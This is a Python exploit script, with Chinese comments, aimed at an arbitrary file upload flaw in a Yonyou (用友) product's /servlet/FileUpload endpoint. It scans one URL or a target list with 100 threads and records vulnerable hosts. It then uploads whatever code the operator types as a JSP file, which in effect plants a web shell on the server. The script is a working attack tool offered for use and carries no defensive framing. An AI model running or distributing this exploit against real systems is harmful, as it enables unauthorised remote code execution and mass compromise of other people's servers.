import requests
import re
import argparse
import sys
import time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """                                  
 ___.__. ____   ____    ____ ___.__. ____  __ __ 
<   |  |/  _ \ /    \  / ___<   |  |/  _ \|  |  \
 \___  (  <_> )   |  \/ /_/  >___  (  <_> )  |  /
 / ____|\____/|___|  /\___  // ____|\____/|____/ 
 \/                \//_____/ \/                  
                                   version:1.1.1                           
"""
    print(test)

def main():
    banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="用友存在文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/servlet/FileUpload?fileName=test.jsp&actionID=update'
    url = target + payload
    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Connection': 'close'
    }
    data = '11111111111111111111111'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        response = requests.post(url=url,headers=headers,data=data,verify=False)
        if response.status_code == 200 :
            print(f"[*该网址存在任意文件上传漏洞{target}]")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
                return True
        else:
            print(f"[+该网址不存在任意文件上传漏洞{target}]")
            return False
    except Exception as e:
        print(f"[-该网址存在问题，请手动检测{target}]")
        return False
def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    cmd = input('请输入你要执行的代码：')
    headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close'
    }
    payload = '/servlet/FileUpload?fileName=test.jsp&actionID=update'            
    data = cmd
    res = requests.post(url=target+payload,headers=headers,data=data)
    print("漏洞成功利用")
if __name__ =='__main__':
    main()